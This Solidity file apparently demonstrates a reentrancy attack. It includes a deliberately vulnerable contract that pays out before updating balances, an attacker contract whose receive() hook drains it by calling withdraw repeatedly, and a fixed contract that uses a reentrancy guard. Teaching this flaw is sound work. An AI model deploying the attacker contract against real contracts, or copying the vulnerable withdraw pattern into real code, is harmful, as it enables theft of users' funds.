// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// === Vulnerable Contract
contract VulnerableContract {
  mapping(address => uint256) public balances;

  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, 'Insufficient balance');

    (bool success, ) = msg.sender.call{value: amount}('');
    require(success, 'Transfer failed');

    unchecked {
      balances[msg.sender] -= amount;
    }
  }
}

// === Attacker Contract
contract AttackerContract {
  VulnerableContract public vulnerableContract;

  constructor(address _vulnerableContractAddress) {
    vulnerableContract = VulnerableContract(_vulnerableContractAddress);
  }

  // === This is called when the contract receives ether
  receive() external payable {
    if (address(vulnerableContract).balance >= 1 ether) {
      vulnerableContract.withdraw(1 ether);
    }
  }

  function exploit() external payable {
    require(msg.value >= 1 ether);
    vulnerableContract.deposit{value: 1 ether}();
    vulnerableContract.withdraw(1 ether);
  }
}

contract ReentrancyGuard {
  bool internal _notInteracted = true;

  modifier nonReentrant() {
    require(_notInteracted, 'ReentrancyGuard: reentrant call');
    _notInteracted = false;
    _;
    _notInteracted = true;
  }
}

contract FixedContract is ReentrancyGuard {
  mapping(address => uint256) public balances;

  function deposit() external payable nonReentrant {
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 amount) external nonReentrant {
    require(balances[msg.sender] >= amount, 'Insufficient balance');

    balances[msg.sender] -= amount;

    (bool success, ) = msg.sender.call{value: amount}('');
    require(success, 'Transfer failed');
  }
}
